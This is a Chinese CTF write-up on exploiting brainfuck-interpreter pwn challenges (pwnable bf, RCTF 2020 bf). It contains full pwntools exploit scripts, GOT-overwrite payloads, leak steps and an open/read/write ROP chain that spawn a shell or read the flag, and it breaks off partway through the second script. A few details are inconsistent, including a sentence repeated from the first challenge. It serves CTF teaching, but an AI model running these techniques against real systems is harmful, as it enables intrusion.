> 原文链接: https://www.anquanke.com//post/id/208940 


# 解释器类型的Pwn题目总结


                                阅读量   
                                **269709**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01bde21891cec4ffd3.png)](https://p1.ssl.qhimg.com/t01bde21891cec4ffd3.png)



## 0x01 写在前面

在近期的比赛中，发现解释器类型的题目越来越多，因此决定进行一个专项的题目总结。
<li>
`Pwnable_bf`：此题是利用了`brainfuck`本身的特性以及题目没有对GOT进行保护导致我们可以便捷的进行利用。</li>
<li>
`2020 RCTF bf`：此题是因为解释器的实现存在漏洞，并不是利用语言本身的特性。</li>
<li>
`2020 DAS-CTF OJ0`：此题是直接让我们写程序来读`flag`,而我们读`flag`时又需要绕过一些题目的过滤语句~</li>
<li>
`DEFCON CTF Qualifier 2020 introool`：此题严格来说并不是实现的解释器，但是它仍然是直接依据我们的输入来生成可执行文件，属于广义上的解释器。</li>
<li>
`[Redhat2019] Kaleidoscope`：此题创新性的使用了`fuzz`来解题。</li>
<li>
`2020 DAS-CTF OJ1`：此题仍然为直接让我们写程序来读`flag`,但是他限制了所有括号的使用！</li>


## 0x02 什么是解释器

解释器（英语`Interpreter`），又译为直译器，是一种电脑程序，能够把高级编程语言一行一行直接转译运行。解释器不会一次把整个程序转译出来，只像一位“中间人”，每次运行程序时都要先转成另一种语言再作运行，因此解释器的程序运行速度比较缓慢。它每转译一行程序叙述就立刻运行，然后再转译下一行，再运行，如此不停地进行下去。



## 0x03 以 pwnable bf 为例

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"></a>题目信息

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-12-115639.png)

`32`位程序，开启了`NX`和`Canary`，`Glibc 2.23`。

根据题目所述信息，这是一个[`brainfuck`语言](https://zh.wikipedia.org/wiki/Brainfuck)的解释器。

由于`brainfuck`语言本身十分简单，因此本题中的核心处理逻辑就是`brainfuck`语言本身的处理逻辑。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-12-120216.png)

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

我们分析发现，此程序本身并没有可利用的漏洞，那么我们就可以利用`brainfuck`语言本身的特性来完成利用，因为题目没有对我们可操作的指针`p`做任何限制，也就是说，我们可以直接利用`brainfuck`语言本身来进行任意地址读写，那么我们的思路就很明显了，利用指针移动将`p`移动到`got`表，劫持`got`表内容即可。

我们决定将`putchar[@got](https://github.com/got)`改为`_start`，将`memset[@got](https://github.com/got)`改为`gets[@got](https://github.com/got)`，将`fgets[@got](https://github.com/got)`改为`system[@got](https://github.com/got)`。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

首先，以下信息是我们已知的：

```
getchar@got位于 ： 0x0804A00C
fgets@got位于   ： 0x0804A010
memset@got位于  ： 0x0804A02C
putchar@got位于 ： 0x0804A030
p 指针地址       ： 0x0804A080
```

接下来我们开始构造`payload`:
<li>首先执行一次`getchar`函数。
<pre><code class="lang-python hljs">payload  = ','
</code></pre>
</li>
<li>将指针`p`用`&lt;`操作符移动到`getchar[@got](https://github.com/got)`。
<pre><code class="lang-python hljs">payload += '&lt;' * 0x70
</code></pre>
</li>
<li>然后逐位输出`getchar[@got](https://github.com/got)`的值。
<pre><code class="lang-python hljs">payload += '.&gt;.&gt;.&gt;.&gt;'
</code></pre>
</li>
<li>然后继续篡改`fgets[@got](https://github.com/got)`为`system[@got](https://github.com/got)`。
<pre><code class="lang-python hljs">payload += ',&gt;,&gt;,&gt;,&gt;'
</code></pre>
</li>
<li>移动指针到`memset[@got](https://github.com/got)`。
<pre><code class="lang-python hljs">payload += '&gt;' * 0x18
</code></pre>
</li>
<li>篡改`memset[@got](https://github.com/got)`为`gets[@got](https://github.com/got)`。
<pre><code class="lang-python hljs">payload += ',&gt;,&gt;,&gt;,&gt;'
</code></pre>
</li>
<li>继续篡改`putchar[@got](https://github.com/got)`为`main`。
<pre><code class="lang-python hljs">payload += ',&gt;,&gt;,&gt;,&gt;'
</code></pre>
</li>
<li>触发`putchar`函数。
<pre><code class="lang-pytho">payload += '.'
</code></pre>
</li>
### <a class="reference-link" name="FInal%20Exploit"></a>FInal Exploit

```
from pwn import *
import traceback
import sys
context.log_level='debug'
# context.arch='amd64'
context.arch='i386'

bf=ELF('./bf', checksec = False)

if context.arch == 'amd64':
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
elif context.arch == 'i386':
    try:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
    except:
        libc=ELF("/lib32/libc.so.6", checksec = False)

def get_sh(Use_other_libc = False , Use_ssh = False):
    global libc
    if args['REMOTE'] :
        if Use_other_libc :
            libc = ELF("./BUUOJ_libc/libc-2.23-32.so", checksec = False)
        if Use_ssh :
            s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
            return s.process("./bf")
        else:
            return remote(sys.argv[1], sys.argv[2])
    else:
        return process("./bf")

def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if int_mode :
        return_address = int(sh.recvuntil(end_string,drop=True),16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].ljust(8,'x00'))
    elif context.arch == 'amd64':
        return_address=u64(sh.recvuntil(end_string,drop=True).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string,drop=True).ljust(4,'x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        log.success(info + str(hex(return_address)))
    return return_address

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

def get_gdb(sh,gdbscript=None,stop=False):
    gdb.attach(sh,gdbscript=gdbscript)
    if stop :
        raw_input()

def Multi_Attack():
    # testnokill.__main__()
    return

def Attack(sh=None,ip=None,port=None):
    if ip != None and port !=None:
        try:
            sh = remote(ip,port)
        except:
            return 'ERROR : Can not connect to target server!'
    try:
        # Your Code here
        payload  = ','
        payload += '&lt;' * 0x94
        payload += '.&gt;.&gt;.&gt;.&gt;'
        payload += ',&gt;,&gt;,&gt;,&gt;'
        payload += '&gt;' * 0x18
        payload += ',&gt;,&gt;,&gt;,&gt;'
        payload += ',&gt;,&gt;,&gt;,&gt;'
        payload += '.'
        sh.recvuntil('type some brainfuck instructions except [ ]') 
        sh.sendline(payload)
        sh.send('x01')
        libc.address = get_address(sh=sh,info='LIBC ADDRESS --&gt; ',start_string='n',address_len=4,offset=-libc.symbols['getchar'])
        for i in p32(libc.symbols['system']):
            sh.send(i)
        for i in p32(libc.symbols['gets']):
            sh.send(i)
        for i in p32(0x08048671):
            sh.send(i)
        sh.sendline('/bin/sh')
        sh.interactive()
        flag=get_flag(sh)
        sh.close()
        return flag
    except Exception as e:
        traceback.print_exc()
        sh.close()
        return 'ERROR : Runtime error!'

if __name__ == "__main__":
    sh = get_sh(Use_other_libc=True)
    flag = Attack(sh=sh)
    log.success('The flag is ' + re.search(r'flag`{`.+`}`',flag).group())
```



## 0x04 以 2020 RCTF bf 为例

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"></a>题目信息

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-12-140441.png)

`64`位程序，保护全开，`Glibc 2.27`。

根据题目所述信息，这是一个[`brainfuck`语言](https://zh.wikipedia.org/wiki/Brainfuck)的解释器。

这道题目的难度就要比`pwnable bf`难得多，首先，题目整体使用了`C++`编写，这对于我们的逆向造成了一定的难度。

然后，本题的操作指针`p`位于栈上，且做了溢出保护：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-12-141326.png)

指针的前后移动不允许超出局部变量`s`和`code`的范围。

然后和`pwnable bf`相比，支持了`[`和`]`命令：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-12-142758.png)

在`brainfuck`官方文档中:

```
[ : 如果指针指向的单元值为零，向后跳转到对应的 ] 指令的次一指令处。
] : 如果指针指向的单元值不为零，向前跳转到对应的 [ 指令的次一指令处。
[ 等价于 while (*ptr) `{`
] 等价于 `}`
```

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

那么接下来，我们来做一个越界测试，我们写一个如下所示的程序：

```
ptr++;
while(*ptr)`{`
    ptr++;
    putchar(ptr);
    (*ptr++);
`}`
getchar(ptr);
```

我们决定将`putchar[@got](https://github.com/got)`改为`_start`，将`memset[@got](https://github.com/got)`改为`gets[@got](https://github.com/got)`，将`fgets[@got](https://github.com/got)`改为`system[@got](https://github.com/got)`。

我们可以将其理解成一个简单的`fuzz`程序，如果无漏洞发生，应当`getchar(ptr);`永远不会被执行，直到`ptr`越界指向非法内存而报错。

将其写为`brainfuck`程序应当为`+[&gt;.+],`，我们输入到程序看看结果。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-12-150034.png)

程序停了下来！说明此程序中的`[`和`]`的操作符实现必定存在问题，那么我们来看看我们读入的那一个字符被写到了哪里。

```
sh.recvuntil('enter your code:')
get_gdb(sh)
sh.sendline('+[&gt;.+],')
```

这是执行代码前的栈情况：

```
gef➤  x/400gx $rsp
0x7ffcc837f3e0:    0x00007f1cc11f99e0    0x010a7f1cc0e9aef0
0x7ffcc837f3f0:    0x0000000100000007    0x00007f1cc12147ca
0x7ffcc837f400:    0x00007f1cc11fa901    0x0000000000000000
0x7ffcc837f410:    0x00005566d3bb40d0    0x00005566d3bb4100
0x7ffcc837f420:    0x00005566d3bb40d0    0x0000000000000002
0x7ffcc837f430:    0x00005566d3bb3e70    0x0000000000000008
0x7ffcc837f440:    0x00005566d3bb3ec0    0x00005566d3bb3ec0
0x7ffcc837f450:    0x00005566d3bb40c0    0x00005566d3bb3e88
0x7ffcc837f460:    0x00005566d3bb3ec0    0x00005566d3bb3ec0
0x7ffcc837f470:    0x00005566d3bb40c0    0x00005566d3bb3e88
0x7ffcc837f480:    0x0000000000000000    0x0000000000000000
......
0x7ffcc837f870:    0x0000000000000000    0x0000000000000000
0x7ffcc837f880:    0x00007ffcc837f890    0x0000000000000007
0x7ffcc837f890:    0x002c5d2b2e3e5b2b    0x0000000000000000
0x7ffcc837f8a0:    0x00005566d35f4980    0xca398a01bea61c00
0x7ffcc837f8b0:    0x00007ffcc837f9a0    0x0000000000000000
0x7ffcc837f8c0:    0x00005566d35f4980    0x00007f1cc088cb97
0x7ffcc837f8d0:    0xffffffffffffff90    0x00007ffcc837f9a8
0x7ffcc837f8e0:    0x00000001ffffff90    0x00005566d35f1684
0x7ffcc837f8f0:    0x0000000000000000    0xacc40576de043fed
0x7ffcc837f900:    0x00005566d35f1420    0x00007ffcc837f9a0
0x7ffcc837f910:    0x0000000000000000    0x0000000000000000
0x7ffcc837f920:    0xf9f033a7bca43fed    0xf83022d9db9a3fed
0x7ffcc837f930:    0x0000000000000000    0x0000000000000000
0x7ffcc837f940:    0x0000000000000000    0x00007f1cc120d733
0x7ffcc837f950:    0x00007f1cc11ed2b8    0x0000000000198d4c
0x7ffcc837f960:    0x0000000000000000    0x0000000000000000
0x7ffcc837f970:    0x0000000000000000    0x00005566d35f1420
0x7ffcc837f980:    0x00007ffcc837f9a0    0x00005566d35f144a
0x7ffcc837f990:    0x00007ffcc837f998    0x000000000000001c
0x7ffcc837f9a0:    0x0000000000000001    0x00007ffcc8381335
0x7ffcc837f9b0:    0x0000000000000000    0x00007ffcc838133a
0x7ffcc837f9c0:    0x00007ffcc8381390    0x00007ffcc83813e8
0x7ffcc837f9d0:    0x00007ffcc83813fa    0x00007ffcc838141b
0x7ffcc837f9e0:    0x00007ffcc8381430    0x00007ffcc8381441
0x7ffcc837f9f0:    0x00007ffcc8381452    0x00007ffcc8381460
0x7ffcc837fa00:    0x00007ffcc83814e2    0x00007ffcc83814ed
0x7ffcc837fa10:    0x00007ffcc8381501    0x00007ffcc838150c
0x7ffcc837fa20:    0x00007ffcc838151f    0x00007ffcc8381530
0x7ffcc837fa30:    0x00007ffcc8381540    0x00007ffcc8381550
0x7ffcc837fa40:    0x00007ffcc8381579    0x00007ffcc8381590
0x7ffcc837fa50:    0x00007ffcc83815e2    0x00007ffcc8381637
0x7ffcc837fa60:    0x00007ffcc8381659    0x00007ffcc838166f
0x7ffcc837fa70:    0x00007ffcc8381684    0x00007ffcc83816b0
0x7ffcc837fa80:    0x00007ffcc83816c3    0x00007ffcc83816d0
0x7ffcc837fa90:    0x00007ffcc83816e4    0x00007ffcc8381718
0x7ffcc837faa0:    0x00007ffcc8381747    0x00007ffcc8381759
0x7ffcc837fab0:    0x00007ffcc8381774    0x00007ffcc8381793
0x7ffcc837fac0:    0x00007ffcc83817bc    0x00007ffcc83817d0
0x7ffcc837fad0:    0x00007ffcc83817e1    0x00007ffcc83817f3
0x7ffcc837fae0:    0x00007ffcc8381805    0x00007ffcc8381826
0x7ffcc837faf0:    0x00007ffcc8381846    0x00007ffcc8381864
0x7ffcc837fb00:    0x00007ffcc8381884    0x00007ffcc8381895
0x7ffcc837fb10:    0x00007ffcc83818f1    0x00007ffcc8381903
0x7ffcc837fb20:    0x00007ffcc838191f    0x00007ffcc8381932
0x7ffcc837fb30:    0x00007ffcc8381949    0x00007ffcc8381976
0x7ffcc837fb40:    0x00007ffcc8381993    0x00007ffcc838199b
0x7ffcc837fb50:    0x00007ffcc83819cd    0x00007ffcc83819e1
0x7ffcc837fb60:    0x00007ffcc83819f8    0x00007ffcc8381fe4
```

这是执行后的栈情况：

```
gef➤  x/400gx $rsp
0x7ffcc837f3e0:    0x00007f1cc11f99e0    0x010a7f1cc0e9aef0
0x7ffcc837f3f0:    0x0000000700000007    0x00007ffcc837f880
0x7ffcc837f400:    0x00007f1cc11fa901    0x0000000000000000
0x7ffcc837f410:    0x00005566d3bb40d0    0x00005566d3bb4100
0x7ffcc837f420:    0x00005566d3bb40d0    0x0000000000000002
0x7ffcc837f430:    0x00005566d3bb3e70    0x0000000000000008
0x7ffcc837f440:    0x00005566d3bb3ec0    0x00005566d3bb3ec0
0x7ffcc837f450:    0x00005566d3bb40c0    0x00005566d3bb3e88
0x7ffcc837f460:    0x00005566d3bb3ec0    0x00005566d3bb3ec0
0x7ffcc837f470:    0x00005566d3bb40c0    0x00005566d3bb3e88
0x7ffcc837f480:    0x0101010101010101    0x0101010101010101
......
0x7ffcc837f870:    0x0101010101010101    0x0101010101010101
0x7ffcc837f880:    0x00007ffcc837f841    0x0000000000000007
0x7ffcc837f890:    0x002c5d2b2e3e5b2b    0x0000000000000000
0x7ffcc837f8a0:    0x00005566d35f4980    0xca398a01bea61c00
0x7ffcc837f8b0:    0x00007ffcc837f9a0    0x0000000000000000
0x7ffcc837f8c0:    0x00005566d35f4980    0x00007f1cc088cb97
0x7ffcc837f8d0:    0xffffffffffffff90    0x00007ffcc837f9a8
0x7ffcc837f8e0:    0x00000001ffffff90    0x00005566d35f1684
0x7ffcc837f8f0:    0x0000000000000000    0xacc40576de043fed
0x7ffcc837f900:    0x00005566d35f1420    0x00007ffcc837f9a0
0x7ffcc837f910:    0x0000000000000000    0x0000000000000000
0x7ffcc837f920:    0xf9f033a7bca43fed    0xf83022d9db9a3fed
0x7ffcc837f930:    0x0000000000000000    0x0000000000000000
0x7ffcc837f940:    0x0000000000000000    0x00007f1cc120d733
0x7ffcc837f950:    0x00007f1cc11ed2b8    0x0000000000198d4c
0x7ffcc837f960:    0x0000000000000000    0x0000000000000000
0x7ffcc837f970:    0x0000000000000000    0x00005566d35f1420
0x7ffcc837f980:    0x00007ffcc837f9a0    0x00005566d35f144a
0x7ffcc837f990:    0x00007ffcc837f998    0x000000000000001c
0x7ffcc837f9a0:    0x0000000000000001    0x00007ffcc8381335
0x7ffcc837f9b0:    0x0000000000000000    0x00007ffcc838133a
0x7ffcc837f9c0:    0x00007ffcc8381390    0x00007ffcc83813e8
0x7ffcc837f9d0:    0x00007ffcc83813fa    0x00007ffcc838141b
0x7ffcc837f9e0:    0x00007ffcc8381430    0x00007ffcc8381441
0x7ffcc837f9f0:    0x00007ffcc8381452    0x00007ffcc8381460
0x7ffcc837fa00:    0x00007ffcc83814e2    0x00007ffcc83814ed
0x7ffcc837fa10:    0x00007ffcc8381501    0x00007ffcc838150c
0x7ffcc837fa20:    0x00007ffcc838151f    0x00007ffcc8381530
0x7ffcc837fa30:    0x00007ffcc8381540    0x00007ffcc8381550
0x7ffcc837fa40:    0x00007ffcc8381579    0x00007ffcc8381590
0x7ffcc837fa50:    0x00007ffcc83815e2    0x00007ffcc8381637
0x7ffcc837fa60:    0x00007ffcc8381659    0x00007ffcc838166f
0x7ffcc837fa70:    0x00007ffcc8381684    0x00007ffcc83816b0
0x7ffcc837fa80:    0x00007ffcc83816c3    0x00007ffcc83816d0
0x7ffcc837fa90:    0x00007ffcc83816e4    0x00007ffcc8381718
0x7ffcc837faa0:    0x00007ffcc8381747    0x00007ffcc8381759
0x7ffcc837fab0:    0x00007ffcc8381774    0x00007ffcc8381793
0x7ffcc837fac0:    0x00007ffcc83817bc    0x00007ffcc83817d0
0x7ffcc837fad0:    0x00007ffcc83817e1    0x00007ffcc83817f3
0x7ffcc837fae0:    0x00007ffcc8381805    0x00007ffcc8381826
0x7ffcc837faf0:    0x00007ffcc8381846    0x00007ffcc8381864
0x7ffcc837fb00:    0x00007ffcc8381884    0x00007ffcc8381895
0x7ffcc837fb10:    0x00007ffcc83818f1    0x00007ffcc8381903
0x7ffcc837fb20:    0x00007ffcc838191f    0x00007ffcc8381932
0x7ffcc837fb30:    0x00007ffcc8381949    0x00007ffcc8381976
0x7ffcc837fb40:    0x00007ffcc8381993    0x00007ffcc838199b
0x7ffcc837fb50:    0x00007ffcc83819cd    0x00007ffcc83819e1
0x7ffcc837fb60:    0x00007ffcc83819f8    0x00007ffcc8381fe4
```

请注意`0x7ffcc837f880`处的代码，可以发现，我们可以越界写一个字符，而这个位置恰好储存了我们的代码区域的地址，那么我们事实上可以将其修改到返回地址处，这样我们就可以程序做任意地址跳转，并且发现程序会打印我们输入的代码内容，那么我们就可以利用无截断来泄露信息。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用
<li>首先我们需要先泄露原本的`bf_code`的地址末位。
<pre><code class="lang-python hljs">sh.recvuntil('enter your code:')
sh.sendline('+[&gt;.+],')
sh.recvuntil('x00' * 0x3FF)
code_low_addr = u64(sh.recv(1).ljust(8,'x00'))
success("code low bit --&gt; " + str(hex(code_low_addr)))
</code></pre>
</li>
<li>接下来我们进行低位覆盖，将`bf_code`移动到`bf_code + 0x20`的位置上，在那之后我们就能获取到`ESP`的值。
<pre><code class="lang-python hljs">payload = code_low_addr + 0x20
payload = p8((payload) &amp; 0xFF)
sh.send(payload)
sh.recvuntil("done! your code: ")
esp_addr = u64(sh.recv(6).ljust(8,'x00')) - 0x5C0
info('ESP addr--&gt;'+str(hex(esp_addr)))
</code></pre>
</li>
<li>接下来我们选择不跳出循环。
<pre><code class="lang-python hljs">sh.recvuntil('want to continue?')
sh.send('y')
</code></pre>
</li>
<li>重复刚才的步骤，低位覆盖，将`bf_code`移动到`bf_code + 0x38`的位置上，在那之后我们能获取到`LIBC`的基址。
<pre><code class="lang-python hljs">sh.recvuntil('enter your code:')
sh.sendline('+[&gt;.+],')
sh.send(p8((code_low_addr + 0x38) &amp; 0xFF))
sh.recvuntil("done! your code: ")
libc.address = u64(sh.recv(6).ljust(8,'x00')) + 0x00007fd6723b7000 - 0x7fd6723d8b97
info('LIBC ADDRESS --&gt; ' + str(hex(libc.address)))
</code></pre>
</li>
<li>接下来我们选择不跳出循环。
<pre><code class="lang-python hljs">sh.recvuntil('want to continue?')
sh.send('y')
</code></pre>
</li>
<li>重复刚才的步骤，低位覆盖，将`bf_code`移动到`bf_code + 0x30`的位置上，在那之后我们获取到程序加载基址。**同时这又是`RBP`的位置。**
<pre><code class="lang-python hljs">sh.recvuntil('enter your code:')
sh.sendline('+[&gt;.+],')
sh.send(p8((code_low_addr + 0x30) &amp; 0xFF))
sh.recvuntil("done! your code: ")
PIE_address = u64(sh.recv(6).ljust(8,'x00')) - 0x4980
info('PIE ADDRESS --&gt; ' + str(hex(PIE_address)))
</code></pre>
</li>
<li>接下来我们可以构造`ROP`链，首先列出我们需要利用的`gadgets`。
<pre><code class="hljs http">0x000000000002155f: pop rdi; ret;
0x0000000000023e6a: pop rsi; ret;
0x0000000000001b96: pop rdx; ret;
0x00000000000439c8: pop rax; ret;
0x00000000000d2975: syscall; ret;
</code></pre>
那么我们可以构造如下`ROP chain`：
<pre><code class="lang-python hljs"># read(0,BSS+0x400,0x20)
ROP_chain  = p64(libc.address + 0x000000000002155f)
ROP_chain += p64(0)
ROP_chain += p64(libc.address + 0x0000000000023e6a)
ROP_chain += p64(PIE_address + bf.bss() + 0x400)
ROP_chain += p64(libc.address + 0x0000000000001b96)
ROP_chain += p64(0x20)
ROP_chain += p64(libc.address + 0x00000000000439c8)
ROP_chain += p64(0)
ROP_chain += p64(libc.address + 0x00000000000d2975)
# open(BSS+0x400,0)
ROP_chain += p64(libc.address + 0x000000000002155f)
ROP_chain += p64(PIE_address + bf.bss() + 0x400)
ROP_chain += p64(libc.address + 0x0000000000023e6a)
ROP_chain += p64(0)
ROP_chain += p64(libc.address + 0x00000000000439c8)
ROP_chain += p64(2)
ROP_chain += p64(libc.address + 0x00000000000d2975)
# read(3,BSS+0x500,0x20)
ROP_chain += p64(libc.address + 0x000000000002155f)
ROP_chain += p64(3)
ROP_chain += p64(libc.address + 0x0000000000023e6a)
ROP_chain += p64(PIE_address + bf.bss() + 0x500)
ROP_chain += p64(libc.address + 0x0000000000001b96)
ROP_chain += p64(0x20)
ROP_chain += p64(libc.address + 0x00000000000439c8)
ROP_chain += p64(0)
ROP_chain += p64(libc.address + 0x00000000000d2975)
# write(0,BSS+0x500,0x20)
ROP_chain += p64(libc.address + 0x000000000002155f)
ROP_chain += p64(1)
ROP_chain += p64(libc.address + 0x0000000000023e6a)
ROP_chain += p64(PIE_address + bf.bss() + 0x500)
ROP_chain += p64(libc.address + 0x0000000000001b96)
ROP_chain += p64(0x20)
ROP_chain += p64(libc.address + 0x00000000000439c8)
ROP_chain += p64(1)
ROP_chain += p64(libc.address + 0x00000000000d2975)
# exit(0)
ROP_chain += p64(libc.address + 0x000000000002155f)
ROP_chain += p64(0)
ROP_chain += p64(libc.address + 0x00000000000439c8)
ROP_chain += p64(60)
ROP_chain += p64(libc.address + 0x00000000000d2975)
for i in ['[',']']:
    if i in ROP_chain:
        raise ValueError('ROP_chain ERROR')
</code></pre>
</li>
<li>接下来我们选择不跳出循环。
<pre><code class="lang-python hljs">sh.recvuntil('want to continue?')
sh.send('y')
</code></pre>
</li>
<li>覆盖返回地址，并恢复`code`指针。
<pre><code class="lang-python hljs">sh.recvuntil('enter your code:')
sh.sendline(p64(0) + ROP_chain)

sh.recvuntil('want to continue?')
sh.send('y')

sh.recvuntil('enter your code:')
sh.sendline('+[&gt;.+],')
sh.send(p8((code_low_addr) &amp; 0xFF))
sh.send(p8((code_low_addr) &amp; 0xFF))
</code></pre>
</li>
<li>跳出循环即可获取`flag`。[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-13-140049.png)
</li>
### <a class="reference-link" name="FInal%20Exploit"></a>FInal Exploit

⚠️：概率成功，因为有概率我们不能成功的触发`[`和`]`的漏洞。

```
from pwn import *
import traceback
import sys
context.log_level='debug'
context.arch='amd64'
# context.arch='i386'

bf=ELF('./bf', checksec = False)

if context.arch == 'amd64':
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
elif context.arch == 'i386':
    try:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
    except:
        libc=ELF("/lib32/libc.so.6", checksec = False)

def get_sh(Use_other_libc = False , Use_ssh = False):
    global libc
    if args['REMOTE'] :
        if Use_other_libc :
            libc = ELF("./", checksec = False)
        if Use_ssh :
            s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
            return s.process("./bf")
        else:
            return remote(sys.argv[1], sys.argv[2])
    else:
        return process("./bf")

def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if int_mode :
        return_address = int(sh.recvuntil(end_string,drop=True),16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].ljust(8,'x00'))
    elif context.arch == 'amd64':
        return_address=u64(sh.recvuntil(end_string,drop=True).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string,drop=True).ljust(4,'x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        log.success(info + str(hex(return_address)))
    return return_address

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

def get_gdb(sh,gdbscript=None,stop=False):
    gdb.attach(sh,gdbscript=gdbscript)
    if stop :
        raw_input()

def Multi_Attack():
    # testnokill.__main__()
    return

def Attack(sh=None,ip=None,port=None):
    while True:
        try:
            sh = get_sh()
            # Your Code here
            sh.recvuntil('enter your code:' , timeout = 0.3)
            sh.sendline('+[&gt;.+],')
            sh.recvuntil('x00' * 0x3FF)
            code_low_addr = u64(sh.recv(1).ljust(8,'x00'))
            success("code low bit --&gt; " + str(hex(code_low_addr)))

            payload = code_low_addr + 0x20
            payload = p8((payload) &amp; 0xFF)
            sh.send(payload)
            sh.recvuntil("done! your code: ", timeout = 0.3)
            esp_addr = u64(sh.recv(6).ljust(8,'x00')) - 0x5C0
            info('ESP addr--&gt;'+str(hex(esp_addr)))

            sh.recvuntil('want to continue?' , timeout = 0.3)
            sh.send('y')

            sh.recvuntil('enter your code:' , timeout = 0.3)
            sh.sendline('+[&gt;.+],')
            sh.send(p8((code_low_addr + 0x38) &amp; 0xFF))
            sh.recvuntil("done! your code: ", timeout = 0.3)
            libc.address = u64(sh.recv(6).ljust(8,'x00')) + 0x00007fd6723b7000 - 0x7fd6723d8b97
            info('LIBC ADDRESS --&gt; ' + str(hex(libc.address)))

            sh.recvuntil('want to continue?' , timeout = 0.3)
            sh.send('y')

            sh.recvuntil('enter your code:' , timeout = 0.3)
            sh.sendline('+[&gt;.+],')
            sh.send(p8((code_low_addr + 0x30) &amp; 0xFF))
            sh.recvuntil("done! your code: ", timeout = 0.3)
            PIE_address = u64(sh.recv(6).ljust(8,'x00')) - 0x4980
            info('PIE ADDRESS --&gt; ' + str(hex(PIE_address)))

            # read(0,BSS+0x400,0x20)
            ROP_chain  = p64(libc.address + 0x000000000002155f)
            ROP_chain += p64(0)
            ROP_chain += p64(libc.address + 0x0000000000023e6a)
            ROP_chain += p64(PIE_address + bf.bss() + 0x400)
            ROP_chain += p64(libc.address + 0x0000000000001b96)
            ROP_chain += p64(0x20)
            ROP_chain += p64(libc.address + 0x00000000000439c8)
            ROP_chain += p64(0)
            ROP_chain += p64(libc.address + 0x00000000000d2975)
            # open(BSS+0x400,0)
            ROP_chain += p64(libc.address + 0x000000000002155f)
            ROP_chain += p64(PIE_address + bf.bss() + 0x400)
            ROP_chain += p64(libc.address + 0x0000000000023e6a)
            ROP_chain += p64(0)
